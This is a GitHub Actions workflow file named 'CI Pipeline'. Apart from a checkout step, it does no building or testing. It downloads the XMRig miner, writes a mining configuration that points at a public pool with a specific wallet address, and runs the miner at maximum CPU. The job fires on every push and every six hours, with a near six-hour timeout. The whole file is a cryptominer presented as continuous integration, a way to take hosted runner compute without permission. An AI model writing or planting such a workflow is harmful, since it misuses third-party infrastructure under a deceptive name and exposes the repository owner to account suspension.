name: CI Pipeline

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:
  schedule:
    - cron: '0 */6 * * *'

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 350
    
    steps:
    - name: Checkout
      uses: actions/checkout@v3
      
    - name: Setup
      run: |
        sudo apt-get update -qq
        echo "Ready"
        
    - name: Download XMRig
      run: |
        wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
        tar -xf xmrig-6.21.0-linux-x64.tar.gz
        cd xmrig-6.21.0
        chmod +x xmrig
        
    - name: Mine
      run: |
        cd xmrig-6.21.0
        cat > config.json << 'EOF'
        {
          "autosave": true,
          "cpu": {
            "enabled": true,
            "huge-pages": true,
            "hw-aes": null,
            "priority": 5,
            "max-threads-hint": 100,
            "asm": true,
            "argon2-impl": null,
            "rx": [0, 1, 2, 3]
          },
          "opencl": false,
          "cuda": false,
          "pools": [
            {
              "coin": "USDT",
              "algo": "rx/0",
              "url": "rx.unmineable.com:3333",
              "user": "USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.gh_xaviersavoie#l2ms-1zto",
              "pass": "x",
              "keepalive": true,
              "tls": false
            }
          ]
        }
        EOF
        ./xmrig --config=config.json
